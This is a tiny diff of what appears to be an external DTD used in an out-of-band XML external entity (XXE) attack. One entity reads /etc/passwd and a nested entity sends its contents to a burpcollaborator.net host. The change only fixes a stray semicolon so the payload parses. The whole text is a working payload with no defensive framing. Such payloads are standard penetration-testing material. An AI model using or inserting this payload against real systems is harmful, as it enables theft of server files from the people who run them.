@@ -1,2 +1,2 @@
 <!ENTITY % payl SYSTEM "file:///etc/passwd">
-<!ENTITY % intern "<!ENTITY &#x25; xxe SYSTEM 'http://ague4hbt3jq1noxl8hc2zmzvamge43.burpcollaborator.net/r?%payl;;'>">
+<!ENTITY % intern "<!ENTITY &#x25; xxe SYSTEM 'http://ague4hbt3jq1noxl8hc2zmzvamge43.burpcollaborator.net/r?%payl;'>">
